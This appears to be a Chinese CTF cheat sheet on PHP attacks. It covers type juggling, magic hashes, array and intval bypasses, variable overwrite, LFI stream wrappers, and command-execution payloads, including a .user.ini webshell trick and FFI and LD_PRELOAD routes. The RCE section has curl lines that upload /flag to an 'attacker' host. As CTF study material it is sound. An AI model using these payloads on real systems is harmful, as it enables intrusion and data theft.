## [g-php-weak] PHP 弱类型——宽松比较的经典绕过面

### [php-loose-compare] PHP 弱类型比较绕过 | medium | loose-compare;type-juggling | Magic Hash;类型混淆
> PHP `==` 只比较值而 `===` 同时比较类型，字符串与数字之间的隐式转换是登录、哈希校验类题目的头号突破口。

#### 这个条目的作用
`==` 只比较"值"，`===` 才同时比较"值和类型"。两个不同类型的值用 `==` 比较时，PHP 会先把它们隐式转换成同一种类型再比——这个转换过程充满了可利用的缝隙。登录校验、哈希比对、权限判断只要用了 `==`，就存在类型混淆绕过面。本条目教你一眼认出 `==`，并背熟 PHP 7 / PHP 8 两张行为表。

#### 前置条件
- 能读 PHP 源码，找到 `==` / `!=` / `in_array`（默认宽松）等比较点
- 知道怎么提交 GET/POST 参数（URL 加 `?a=1`，或 Burp 改请求体）
- 能判断目标 PHP 版本（见第 2 步），因为 PHP 7 与 PHP 8 的行为差异巨大

#### 第 1 步：分清 `==` 与 `===`（先读代码，再决定打不打）
`===` 要求"值和类型完全一致"；`==` 只要求"值一致"，类型不同时自动转换：

```php
var_dump(1 == "1");    // bool(true)   "1" 被转成数字 1
var_dump(1 === "1");   // bool(false)  int 与 string 类型不同
```

在源码里搜 `==`、`!=`、`in_array`、`switch`、`strcmp($a,$b)==0` 这类宽松比较点。看到 `===` / `!==` 就放弃类型混淆，换别的攻击面（注入、传参覆盖等）。

#### 第 2 步：背熟 PHP 7 / PHP 8 对照表（这是考试核心）
每一行都是一道考题的考点，先原样背下：

| 表达式 | PHP 7 | PHP 8 |
| --- | --- | --- |
| `"abc" == 0` | true | false |
| `"0" == "abc"` | true | false |
| `"1e3" == "1000"` | true | true |
| `"0e123" == "0e456"` | true | true |
| `0 == "0e123"` | true | true |
| `null == 0` / `null == ""` | true | true |
| `false == 0` / `false == "0"` | true | true |
| `1 == true` | true | true |

> [!warn] 版本分水岭：PHP 8 起只有"数字字符串"（如 `"1e3"`、`"42"`、`"0e1"`）才参与数值转换，`0 == "abc"` 已失效，老题的纯字符串 payload 在 PHP 8 上直接失效。看到题目先确认版本再选 payload。

先判断版本：看响应头 `X-Powered-By`、报错页、`phpinfo()`，或者直接试一个参数 `?x=abc` 看 `"abc" == 0` 类的比较是否成立来盲测。

#### 第 3 步：在代码里找弱点（识别三种高频形态）
弱点代码长这样，命中任一即进入攻击流程：

```php
// ① 登录：用户输入与"存储值"直接 ==
if ($_POST['pwd'] == $row['password']) { /* 登录成功 */ }

// ② 哈希校验
if (md5($_GET['a']) == md5($_GET['b'])) { /* 通过 */ }

// ③ 权限判断
if ($_POST['role'] == 'admin') { /* 管理员 */ }
```

#### 第 4 步：构造并提交 payload（PHP 7 优先打"字符串对数字"）
PHP 7 下，往"字符串比较"点塞数字 0，任何非数字字符串都会被转成 0：

```txt
?pwd=0        # PHP 7：'admin'==0 → 'admin' 转成 0，0==0 为 true
?pwd=0e123    # "0e123" 按科学计数法 = 0，同样命中（更稳妥）
?role=1       # 1 == 'admin'？PHP 7：'admin' 转 0，1==0 为 false，别用 1，用 ?role=0
?role=0e1     # '0e1' 与 'admin' 比：'admin' 转 0，"0e1" 也等于 0 → true
```

> [!tip] PHP 7 下最通用的试探序列：先 `0`，不行就 `0e1`，再不行上数组（见 php-juggling-bypass 条目）。PHP 8 下 `0` 对非数字字符串失效，直接换 `0e1` 这类数字字符串或数组。

预期结果：响应进入"成功"分支——页面跳转、输出 flag、出现管理菜单、`var_dump` 打印 true。如果不行：换 payload 组合，并核对第 2 步表格确认没记反版本行为。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 传 `0` 不生效 | 目标是 PHP 8，`"abc" == 0` 已为 false | 改传数字字符串 `0e1` / `"1e3"`，或走数组绕过 |
| 用 `==` 打不进登录 | 存储值是纯数字字符串，两侧转数字后不等 | 换 0e 串（见 php-magic-hash）或找别的比较点 |
| 把 `===` 也当弱比较硬打 | 看漏了代码写的是 `===` | `===` 无类型转换，立刻止损换攻击面 |
| `"1" == "01"` 猜成相等 | 两侧都是字符串时不转数字，按字符串比 | 只有"字符串 vs 数字"才转换；数字字符串之间在 PHP 8 按数值比 |

#### 实战要点
1. 先定版本再动手：PHP 8 把大量老 payload 直接废掉，版本判断错了整个攻击方向都是白费。
2. `in_array($needle, $arr)` 默认也是宽松比较，第三参数传 `true` 才是严格模式：`in_array("abc", [0])` 在 PHP 7 为 true，可绕过数组白名单。
3. JSON body 传数字类型：`{"role":1}` 与字符串 `"1"` 在 `==` 下相等，注意"数字 vs 字符串"这一维。
4. `null == 0`、`false == "0"` 在 PHP 8 依然成立：不传参数、传空串、传 `0`、传 `"false"` 可以互换着试。
5. 一条龙记忆法：`==` 只比值 → 字符串/数字/布尔/null 全是一家 → 值相同即过。`===` 就是铁板一块。

### [php-magic-hash] 0e 科学计数 Magic Hash | easy | magic-hash;hash-bypass | 0e串;哈希碰撞
> 以 `0e` 开头且后续全为数字的哈希在 `==` 比较中全部等于 0，公开的 md5/sha1 输入就能让任意两道哈希校验相等。

#### 这个条目的作用
`"0e4620974..."` 这种"0e + 全数字"的字符串，PHP 按科学计数法解析为数值 0。当哈希校验使用 `==`（或 `!=` 的反向）时，两侧只要都是 0e 串，就是 `0 == 0`，恒为 true。本条目给出公开已知的 md5 / sha1 0e 输入，让你不用碰撞也能打通"两道哈希互比"类题目。

#### 前置条件
- 已掌握 `==` 与 `===` 的差异（见 php-loose-compare 条目）
- 目标代码形如 `if (md5($a) == md5($b))`，或 `if (md5($pwd) == $stored)` 且 `$stored` 本身是 0e 串
- 哈希用的是 `==` / `!=` 而非 `===` / `!==`（后者需要真碰撞，见第 4 步）

#### 第 1 步：理解 0e 为什么等于 0（30 秒原理）
PHP 把形如 `"0e123"` 的字符串当科学计数法：`0e123 = 0 × 10^123 = 0`。只要字符串长得像"0e 后面全是数字"，数值就是 0：

```php
var_dump("0e123" == "0e456");  // bool(true)  → 0 == 0
var_dump("0e123" == 0);        // bool(true)
```

> [!tip] PHP 8 下依然成立：`"0e123"` 属于"数字字符串"，仍按数值比较，`0 == 0` 恒真。这条是 PHP 8 里少数没被削的经典路径。

#### 第 2 步：背熟 md5 已知 0e 串（直接抄表）
这些输入的特点是：`md5(输入)` 的输出以 `0e` 开头、后面全是数字：

| 输入 | md5 输出 |
| --- | --- |
| `240610708` | 0e462097431906509019562988736854 |
| `QNKCDZO` | 0e830400451993494058024219903391 |
| `s878926199a` | 0e545993274517709034328855841020 |
| `s155964671a` | 0e342768416822977524708945743633 |
| `aabg7XSs` | 0e087386482136013740957780965295 |

提交 payload（完整可复制）：

```txt
?m=QNKCDZO&m2=240610708   # if (md5($m) == md5($m2))：两侧都是 0e 串，0==0 → 绕过
?pwd=240610708            # if (md5($pwd) == "0e462097...")：目标哈希本身是 0e 串时
```

预期结果：`==` 校验返回 true、进入成功分支。如果不行：确认目标哈希不是 0e 串（见下面排查表），或目标用的是 `===`。

#### 第 3 步：sha1 场景（同一招换函数）
sha1 也有公开 0e 串，三串任取两串即构成互比：

```txt
?s1=aaroZmOk&s2=aaK1STfY   # sha1("aaroZmOk") = 0e66507019969427134894567494305185566735
                           # sha1("aaK1STfY") = 0e76658526655756207688271159624026011393
?s1=aaK1STfY&s2=aaO8zKZF   # aaO8zKZF → 0e8924556490603679597425956543160731307842
```

其余可换输入：`aaroZmOk`、`aaK1STfY`、`aaO8zKZF` 三选二即可。

#### 第 4 步：处理"要求两个输入不同"及强比较的题目
常见附加条件与对应解法：

```txt
?m=QNKCDZO&m2=240610708   # if ($m !== $m2 && md5($m) == md5($m2))
                          # 两个字符串不同（$m !== $m2 成立），两个输出都是 0e 串（== 成立）→ 直接过
```

只有下面两种情况才需要真碰撞（fastcoll 生成两个 md5 输出完全相同的二进制串，再 URL 编码提交）：
- 条件是强比较：`md5($a) === md5($b)` 要求输出逐字节相同，0e 串输出不同、过不去；
- 已知 0e 串被黑名单过滤，需要换一组无特征输入。

```bash
fastcoll -o a.bin b.bin          # 生成两个 md5 相同的文件
# 读取二进制内容后 URL 编码（%XX）提交为 ?a=<encoded>&b=<encoded>
```

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 传 0e 串没反应 | 目标哈希不是 0e 串，`"0e..." == 存储值` 不成立 | 这类题用数组绕过：`?pwd[]=`（见 php-juggling-bypass） |
| `$a !== $b` 条件卡住 | 以为必须真碰撞 | 两个不同 0e 串本身就满足 `!==`，直接试 |
| 提交后 500 | 目标是 `===`，或者把 0e 串传给了 int 参数 | `===` 换 fastcoll 真碰撞；int 参数先确认类型 |
| 抄错 0e 串 | 0e 串太长手打失误 | 从本表复制，别手敲 |

#### 实战要点
1. 0e 串只在 `==` / `!=` 下生效，`===` 下全是废纸——先看比较符号再挑工具。
2. 常见的"固定哈希"题：代码里硬编码 `md5($pwd) == "0e462097431906509019562988736854"`，此时 `?pwd=240610708` 一击必中。
3. 两张表随身带：md5 五串（240610708 / QNKCDZO / s878926199a / s155964671a / aabg7XSs）+ sha1 三串（aaroZmOk / aaK1STfY / aaO8zKZF）。
4. 0e 思想也适用 crc32、md4 等哈希：只要输出能以 0e+数字 开头就可复刻，现算现试。
5. fastcoll 只留给 `===` 和黑名单场景，别拿大炮打蚊子。

### [php-juggling-bypass] 数组绕过与 intval/is_numeric/switch | medium | array-bypass;intval;switch | strcmp
> 向期望字符串或数字的参数塞数组，或利用 is_numeric 与 intval 的口径差异，能让校验静默失败。

#### 这个条目的作用
PHP 的函数和运算符对"数组、特殊字符串"的处理口径千奇百怪：`strcmp` 比到数组直接返回 NULL、`strpos` 找到下标 0 时返回 0（falsy）、`is_numeric` 与 `intval` 对同一字符串结论相反、`switch` 全走 `==`。本条目把这些"口径差"变成可复制的 payload 清单。

#### 前置条件
- 能定位 `strcmp` / `strpos` / `in_array` / `intval` / `is_numeric` / `switch` 的校验点
- 记住一条红线：PHP 8 起"数组 vs 标量函数"从"返回 NULL 绕过"变成"直接抛 TypeError 500"（见下方 danger 提示）
- 能提交 `?key[]=x` 形式的数组参数

#### 第 1 步：strcmp 数组绕过（PHP 7 专属）
代码形如 `if (!strcmp($_GET['pwd'], $secret))` 时，传数组让 strcmp 返回 NULL：

```txt
?pwd[]=x
```

预期结果：`strcmp(array, string)` 在 PHP 7 返回 NULL，`!NULL` 为 true → 进入成功分支。

> [!danger] PHP 8 起数组参数传给 strcmp/strpos/preg_match 等标量函数是致命 TypeError，直接 500，不再"返回 false 绕过"。PHP 8 下此招作废，别浪费时间。

#### 第 2 步：strpos 的 0 混淆（反转判定）
`strpos($input, 'admin')` 在"关键词出现在下标 0"时返回 `0`，`if (strpos(...))` 把 0 当 false 处理，误判为"未匹配"：

```txt
?name=administrator        # 关键词在开头，strpos 返回 0 → if 分支判"未匹配"
```

利用法：若代码是 `if (!strpos($input, 'bad'))` 之类的"未出现才放行"逻辑，让关键词出现在开头即可反转结果。正确写法应是 `!== false`，看到 `if (strpos(...))` 这种裸判断就动手。

#### 第 3 步：intval 与 is_numeric 的口径差（对着表试）
同一字符串，`is_numeric` 与 `intval` 的结论可能完全相反：

| 输入 | is_numeric | intval | 利用 |
| --- | --- | --- | --- |
| `"1e3"` | true | 1 | 绕过 `intval($n) > 100`：`?n=1e3` 校验通过但 intval 只有 1 |
| `"08"` | true | 0 | 骗过"非零"检查：`if (is_numeric($n) && intval($n))` 时 `?n=08` 放行 |
| `"0x1A"` | false（PHP 7 起） | 26 | `is_numeric($n)` 拦不住（false 就跳过后续校验），intval 却很大 |
| 数组 `[]` | false | 1（PHP 7 非空数组） | 绕过 `if (is_int($num))` 之类检查：`?num[]=1` |

```txt
?n=1e3        # 绕过 if (intval($n) > 100)
?n=08         # 绕过 if ($n != 0) 且 is_numeric 检查
?num[]=1      # 绕过 if (is_int($num))
```

> [!warn] 版本敏感：`"0x1A"` 的 intval 十六进制解析与数组 intval 行为随 PHP 7/8 有差异，提交前本地 `php -r 'var_dump(intval("0x1A"), intval([]));'` 确认口径。

#### 第 4 步：switch 宽松比较
`switch ($x) { case 0: ... }` 的分支判断全部走 `==`：

```php
switch ($x) { case 0: echo $flag; break; }
```

```txt
?x=abc     # PHP 7：'abc' == 0 → 命中 case 0
?x=0e1     # PHP 8：'abc' == 0 失效，改用数字字符串 '0e1' == 0 → 命中
```

预期结果：直接走进 `case 0` 分支。如果不行：目标可能用了 `match`（PHP 8 强比较）或 switch 内做了类型判断，换 `0e1` / 空值再试。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `?pwd[]=x` 导致 500 | 目标是 PHP 8，数组参数直接 TypeError | 放弃 strcmp 数组招，换变量覆盖/伪协议入口 |
| `strpos` 绕不过 | 代码写的是 `!== false` 的正确写法 | 裸 `if (strpos())` 才可玩 0 混淆，正确写法换攻击面 |
| `?n=1e3` 不生效 | 校验先 `is_int($n)` 或先转整型 | 确认校验顺序：is_numeric→intval 的顺序才有口径差可钻 |
| switch 打不进 | PHP 8 `"abc"` 不再等于 0 | 改用 `?x=0e1`、`?x=0` 等数字字符串 |
| 数组传进去变量变成 Array 报错 | 代码对变量做了字符串拼接/echo | 找只比较不输出的校验点，或换 intval 类函数的目标 |

#### 实战要点
1. 先摸版本：PHP 8 把"数组 vs 标量函数"这条路封死，但 `intval` 数组、`"1e3"`/`"08"` 口径差部分仍可用。
2. 数组攻击面速记：能够触发"数组 vs 标量"位置的参数（strcmp、md5、sha1、preg_match）全部 `?key[]=1` 试一遍。
3. `"0e1"` 是 PHP 8 的万能数字字符串：`== 0`、`== false`、switch case 0 全中。
4. 遇到 `if (is_numeric($a) && intval($a) > N)` 的模式，第一反应就是 `1e3`、`08` 这种口径差。
5. 所有绕过前先看有没有 `(int)` / `intval` 强转发生在比较之前，发生了就只剩纯 int 玩法。

## [g-php-feat] PHP 特性——变量覆盖、伪协议与 RCE 全家桶

### [php-variable-overwrite] 变量覆盖：extract/parse_str/$$ | medium | extract;parse_str;variable-overwrite | register-globals
> 请求参数被直接灌进变量，auth、role、task 这类局部变量一旦被覆盖，校验形同虚设。

#### 这个条目的作用
PHP 的 `extract()`、`parse_str()` 和 `$$` 语法能把外部输入直接变成普通变量。如果代码里已有 `$auth`、`$role`、`$task` 之类的局部变量，攻击者只靠一个参数就能把它们覆盖成自己想要的值，让"先赋值后校验"的逻辑完全失效。本条目教你在源码里找这种覆盖点并构造一次性 payload。

#### 前置条件
- 能找到代码里的 `extract($_GET/$_POST/$_REQUEST)`、`parse_str($qs)`（无第二参数）、`$$x` 形态
- 记住覆盖对象：布尔登录态、白名单路径、数据库连接串、模板变量、include 的文件名
- 知道 `$_GET` / `$_POST` / `$_REQUEST` 至少一个入口可控

#### 第 1 步：识别覆盖点（先读代码）
见到下面任一形态就是可利用点：

```php
extract($_GET);            // ① $_GET 的每个键都变成同名变量
parse_str($_SERVER['QUERY_STRING']);   // ② 无第二参数时直接覆盖变量
$name = $_GET['n']; $$name = 'pwned';  // ③ 动态变量名
```

接着在函数/文件里找"之后会被使用"的变量：`$auth`、`$admin`、`$role`、`$task`、`$page`、`$db`、`$file`、`$path`——这些就是待覆盖目标。

#### 第 2 步：extract 覆盖（最常见的题）
代码模式：`$auth = false; extract($_GET); if ($auth) { ... }`

```txt
?auth=1
```

预期结果：`extract($_GET)` 把键 `auth` 变成变量 `$auth = "1"`（truthy），`if ($auth)` 进入成功分支。如果不行：`extract` 默认带 `EXTR_OVERWRITE` 以外的标志（如 `EXTR_SKIP`）时不覆盖已存在变量，或变量在 extract 之后又被重新赋值——return 后先看执行顺序。

```php
// 若 extract 用了 EXTR_SKIP，已存在的 $auth 不被覆盖；常见防护，遇见了换别的键
extract($_GET, EXTR_SKIP);
```

#### 第 3 步：parse_str 覆盖（URL 查询串直接灌变量）
`parse_str($qs)` 不传第二参数时，解析结果直接写入当前作用域变量：

```php
$flag = false;
parse_str($_SERVER['QUERY_STRING']);   // 危险写法
if ($flag) echo $flag_content;
```

```txt
?flag=1
```

> [!warn] PHP 8 起 `parse_str` 不传第二参数已标记弃用，但行为仍然存在，老题仍可打。带第二参数 `parse_str($qs, $out)` 是安全的，变量只进 `$out` 数组。

预期结果：`$flag` 被覆盖为 truthy，进入分支。如果不行：目标把 `$_SERVER['QUERY_STRING']` 之外的来源喂给了 parse_str（如 POST 体），换提交位置。

#### 第 4 步：`$$` 动态变量名覆盖
`$$name` 表示"以 `$name` 的值为名字的变量"：

```php
$a = 'flag';
$$a = 'x';      // 等价于 $flag = 'x'

$name = $_GET['n'];
$$name = 'pwned';        // ?n=flag → $flag = 'pwned'
if ($flag === 'pwned') { /* 进入 */ }
```

```txt
?n=flag
```

预期结果：`$flag` 被赋值为 `'pwned'`，条件成立。如果不行：确认后面代码比较的变量名与 `$name` 的值一致（`?n=X` 覆盖的就是 `$X`），且未被赋值前已有初值导致比较对象不同。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 覆盖了但条件不成立 | 变量在 extract 之后又被重新赋值 | 顺执行顺序找最后一次赋值点，覆盖它 |
| `extract` 覆盖不了 | 用了 `EXTR_SKIP` / `EXTR_PREFIX` | 换别的变量名或换 parse_str 入口再试 |
| `?auth=1` 打不进 | 代码检查 `$auth === true`（强比较） | 覆盖为 `true` 无法从请求传入，找布尔用法 `if ($auth)` 的点 |
| 传 `flag` 键没反应 | 提交的是 `?$flag=xxx` 而不是 `?flag=xxx` | 变量名按键名对应：`extract($_GET)` 后 `?key=val` 产生 `$key=val` |
| register_globals 题做不了 | 现代环境默认关闭 | 远古题（PHP < 5.4）才吃这招，现代题换 extract/parse_str |

#### 实战要点
1. 变量覆盖的攻击价值 = 被覆盖变量的下游用途。找"覆盖后马上被 `if` / `include` / 拼接"的变量，别盲目覆盖。
2. 常覆盖清单：`$auth`/`$admin`/`$role`（布尔绕过）、`$page`/`$file`/`$path`（配合 LFI）、`$db`/`$conn`（连接串篡改）、`$tpl`/`$template`（模板注入）。
3. `extract` 默认不覆盖超级全局（`$_GET` 等），别试图覆盖它们，白费力气。
4. 同类入口还有 `mb_parse_str`、`import_request_variables`、`register_globals`，老题换着名试。
5. payload 统一"键名 = 目标变量名"：`?auth=1` 覆盖 `$auth`，`?role=admin` 覆盖 `$role`，值注意 truthy 和强比较的区别。

### [php-pseudo-protocols] 伪协议速查表 | easy | wrappers;php-filter;lfi | php://filter
> LFI 场景下 php:// 协议族既能套 base64 读源码，也能直接执行代码，还能触发 phar 反序列化。

#### 这个条目的作用
拿到一个 `include($_GET['file'])` 之类的 LFI 入口后，下一步就是选协议：`php://filter` 读源码、`php://input` / `data://` 执行代码、`phar://` 触发反序列化、`zip://` 读压缩包。本条目给出一张可抄的协议表 + 每个协议的最小可用 payload。

#### 前置条件
- 已确认存在可控的 `include` / `require` / `file_get_contents` 参数（LFI 入口）
- 知道目标 PHP 版本的 `allow_url_include` 配置（`phpinfo()` 或直接试 payload 判断）
- 能提交 URL 编码后的伪协议串（`#` 要编码成 `%23`，空格编码为 `%20`）

#### 第 1 步：背下协议总表（先对号入座）
| 协议 | 作用 | 示例 |
| --- | --- | --- |
| `php://filter` | 读文件内容并加工输出（最常用） | `php://filter/read=convert.base64-encode/resource=config.php` |
| `php://input` | 把 POST 请求体当输入流 | `include("php://input")` + POST 写马 |
| `data://` | 内联数据，可当代码执行 | `data://text/plain,<?php system('id');?>` |
| `expect://` | 需要 pecl/expect 扩展，直接命令执行 | `expect://id` |
| `phar://` | 触发 phar 元数据反序列化 | `phar://upload/x.phar/test.txt` |
| `zip://` / `compress.zlib://` | 读压缩包内文件 | `zip://a.zip%23b.php` |
| `file://` | 读本地文件 | `file:///etc/passwd` |

#### 第 2 步：php://filter 读源码（第一优先，永远先试）
大多数题没有回显原文（PHP 会把 PHP 文件当代码执行），需要 base64 包装让内容以纯文本输出：

```txt
?file=php://filter/read=convert.base64-encode/resource=index.php
?file=php://filter/read=convert.base64-encode/resource=config.php
?file=php://filter/convert.base64-encode/resource=/etc/passwd
```

预期结果：页面输出一坨 base64，`echo '<base64>' | base64 -d` 解码即得源码。如果不行：换成 `resource=../index.php`（相对路径）、试 `resource=php://filter` 链的组合（`convert.iconv.UCS2.UTF8` 等变体），或路径被拼了 `.php` 后缀时用 `%00` 截断（PHP 5.3 前）或 `?file=...php%00` 无效则换双写。

#### 第 3 步：php://input / data:// 执行代码（allow_url_include=On 时）
前提是 `allow_url_include=On`（现代默认 Off，先探测）：

```txt
POST /?file=php://input
Content-Type: text/plain

<?php system('id'); ?>
```

```txt
?file=data://text/plain,<?php system('id');?>
```

预期结果：`include` 把输入当成 PHP 执行，页面回显 `id` 输出。如果不行（无输出或原样显示源码）：`allow_url_include` 为 Off，改走 filter 读源码路线，别硬刚。

#### 第 4 步：phar:// 触发反序列化（无 unserialize 时也中招）
上传一个"元数据含序列化对象、以 `__HALT_COMPILER(); ?>` 结尾"的 phar 文件，任何 `include` / `file_exists` / `fopen` / `getimagesize` 碰到 `phar://` 路径都会反序列化其元数据：

```txt
?file=phar://upload/x.phar/test.txt
```

预期结果：触发 phar 元数据里的对象被反序列化，配合目标源码里的 `__wakeup` / `__destruct` 等魔术方法形成利用链。如果不行：目标环境禁用了 phar 读取（`phar.readonly` 或路径不可达上传点），确认上传目录可写、可预测文件名。

#### 第 5 步：zip / compress / file 兜底读取
```txt
?file=zip://uploads/a.zip%23shell.php   # # 必须编码为 %23
?file=compress.zlib://uploads/a.gz
?file=file:///etc/passwd
?file=file://C:/Windows/win.ini          # Windows 目标
```

预期结果：读到压缩包内指定文件或绝对路径文件。如果不行：`zip://` 的 `#` 忘记编码会截断路径，先检查 URL 编码。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| filter 输出还是源码不乱码 | 忘了加 base64 包装 | 用 `convert.base64-encode` 中间层 |
| data:// / php://input 无回显 | `allow_url_include=Off` | 改读源码；或配合 `.user.ini` 自动加载（见实战要点 4） |
| phar 不触发 | 元数据没序列化对象 / 没写 `__HALT_COMPILER();` | 用 `Phar::setMetadata()` 生成标准 phar |
| 路径被自动加 `.php` 后缀 | 代码写死 `include($file . '.php')` | filter 链/resource 相对路径绕过；或直接吃后缀只用于读非 php 文件 |
| `#` 丢了导致 zip 读失败 | `#` 在 URL 里是片段标记 | 编码为 `%23` |

#### 实战要点
1. 侦察顺序：`php://filter` 读源码 → 从源码找键/功能 → 再决定是否上代码执行/反序列化协议。
2. filter 可链式组合：`convert.base64-encode` 与 `convert.iconv.*` 组合可在可控字符集下构造任意字节（用于 filter 链 RCE 的无中文回显题）。
3. `data://text/plain,<?php ... ?>` 里的空格和 `?` 记得 URL 编码；`php://input` 需 POST 体配合。
4. `.user.ini` 神技：能上传 `.user.ini` 时写 `auto_prepend_file=php://filter/convert.base64-decode/resource=上传的图片`，图片尾部塞 base64 木马，全目录 PHP 请求都会先执行。
5. 拿到 LFI 优先顺序：读源码 > 读配置（config/db 密码）> 代码执行 > 反序列化。每一步失败立刻降级，别在一条路上死磕。

### [php-rce-functions] 命令执行与代码执行函数表 | medium | rce;command-injection | disable-functions
> system 家族直接回显、eval/assert 家族构造代码执行，拿到一句话后在 disable_functions 环境里还有 LD_PRELOAD/FFI 等硬核路线。

#### 这个条目的作用
CTF 里最常见的终点是"一个可控参数被送进某个执行函数"。本条目把 PHP 的命令执行函数和代码执行函数分两族讲清楚：哪些直接回显、哪些只回最后一行、哪些是语言结构（不能经回调调用），并给出 disable_functions 环境下的路线选择依据。

#### 前置条件
- 已找到可控参数流入 `system` / `eval` / `include` / `unserialize` 等执行点的路径
- 能区分"命令执行"（跑 shell 命令）与"代码执行"（执行 PHP 代码）两类目标
- 会看 `ini_get('disable_functions')` 的输出，知道哪些函数被禁

#### 第 1 步：分清两族执行
| 族 | 函数 | 特点 |
| --- | --- | --- |
| 命令执行 | `system` `exec` `shell_exec` `passthru` `popen` `proc_open` `pcntl_exec` 反引号 | 执行的是系统命令，`system` 直接回显 |
| 代码执行 | `eval` `assert` `create_function`（< PHP 8）`preg_replace /e`（< PHP 7.0）`call_user_func` `array_map` `unserialize` 动态 include | 执行的是 PHP 代码，回显与否看写法 |

#### 第 2 步：命令执行函数逐个试（优先 system）
```txt
/?c=system('id')
/?c=system("cat /flag*")
/?c=shell_exec('id')
/?c=exec('id')          # 只回显最后一行
/?c=passthru('id')      # 二进制输出不转义
/?c=`id`                # 反引号等价 shell_exec
/?c=popen('id','r')
```

预期结果：`system` / `passthru` 直接回显输出。如果不行：函数被禁（报 "call to undefined function" 或 phperror），见第 6 步；`exec` 只显示最后一行注意别被空行迷惑。

#### 第 3 步：代码执行家族（eval / assert 的行为差异）
```txt
/?c=eval('system("id");')
/?c=assert('system("id")')      // PHP < 8：assert 字符串按代码执行；PHP 8 起不再执行
/?c=create_function('','system("id");')   // PHP < 8
/?c=preg_replace('/a/e','system("id")','a')   // PHP < 7.0 的 /e 修饰符
```

> [!warn] `eval` 是语言结构：PHP 8 仍可用，但**不能**放进 `call_user_func('eval', ...)`（会报错）；被禁名单里也不一定有它（disable_functions 拦不了语言结构）。`assert` 从 PHP 8 起不再执行字符串，老题 payload 直接失效。

预期结果：PHP 代码被执行。如果不行：先确认版本（PHP 8 下 assert 已废）、确认 `eval` 参数可控且无语法错误（末尾注意分号和闭合）。

#### 第 4 步：动态调用链（函数名来自参数）
```txt
/?c=call_user_func('system','id')
/?c=array_map('system',array('id'))
/?c=call_user_func_array('system',array('id'))
/?c=$_GET[a]($_GET[b])        // 配合 ?a=system&b=id（老题马甲）
/?c=create_function('',$_GET[x])   // 拼接闭包
```

预期结果：指定的回调执行。如果不行：`call_user_func` 被禁或参数过滤了 `system` 字样，换大小写/编码/`pcntl_exec` 等（见 lang-command-file-cheatsheet 与黑名单绕过条目）。

#### 第 5 步：无回显处理（打不通输出就外带）
命令无回显时用延时和 DNS 外带验证：

```txt
/?c=system('sleep 5')                    # 观察响应是否延迟 5 秒
/?c=system('ping `whoami`.xxxx.dnslog.cn')   # dnslog 记录主机名
/?c=system('curl http://attacker:8080/`cat /flag`')
/?c=system('cat /flag > /tmp/x; curl -T /tmp/x http://attacker/')
```

预期结果：dnslog 面板出现记录或响应可见延时。如果不行：目标不出网（无 curl/wget/ping），改"写文件再读"：`system('cat /flag > /tmp/f')` 后走 LFI 读 `/tmp/f`。

#### 第 6 步：disable_functions 侦察与绕过思路
先看禁了谁再选路线：

```php
/?c=print_r(ini_get('disable_functions'));
```

| 环境 | 可用路线 |
| --- | --- |
| 只禁了部分命令执行函数 | 逐个换 `exec`/`shell_exec`/`popen`/`proc_open`/`pcntl_exec`，总有漏网的 |
| 全禁命令执行但 PHP ≥ 7.4 | FFI：`FFI::cdef("int system(const char*);", "libc.so.6")->system("id");`（被禁时换 libc 路径） |
| 全禁且能写文件 | LD_PRELOAD：`putenv("LD_PRELOAD=/tmp/x.so")` + 触发 `mail()` / `mb_send_mail()`，库构造函数里执行命令（有现成 so 可抄） |
| 古老环境 | `imap_open` 命令注入、`pcntl_exec` 直接 exec 族 |

> [!warn] 先 `ini_get('disable_functions')` 看禁了谁再选路线；老题（assert/实际执行）优先，现代题默认过一遍 LD_PRELOAD / FFI 两条主线。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `system` 报 undefined function | 在 disable_functions 名单里 | 看名单，换未被禁的函数或 LD_PRELOAD/FFI |
| `eval` 进 call_user_func 报错 | eval 是语言结构不能当回调 | 直接调 `eval(...)`，别绕回调 |
| assert 不执行了 | PHP 8 起 assert 字符串不再执行 | 换 eval/动态 include，老 payload 作废 |
| 有回显但只有一行 | 用了 `exec` | 换 `system` / `shell_exec` / `passthru` |
| 命令执行了没输出 | 回显被禁或输出被过滤 | 走延时/DNS 外带/写文件再读 |
| 请求体被 WAF 拦 | 关键字 `system`、`eval` 被过滤 | 参考黑名单绕过条目：编码、拆词、换函数名 |

#### 实战要点
1. 统一话术：命令执行先试 `system('id')`，没回显就 `sleep 5` 探活，再上 dnslog 外带。
2. `eval` 不受 disable_functions 管（语言结构），被禁一堆函数时优先找 eval 点。
3. 动态调用一句话 `?c=$_GET[a]($_GET[b])` 配 `?a=system&b=id` 在许多老题里直接通杀。
4. disable_functions 环境别硬刚被禁名单，先看 PHP 版本：≥7.4 上 FFI，能写文件上 LD_PRELOAD。
5. 拿到执行点后的标准动作流：`id`/`whoami` → 读 `/flag*` → 读配置/数据库 → 横向，别一上来就打大 payload。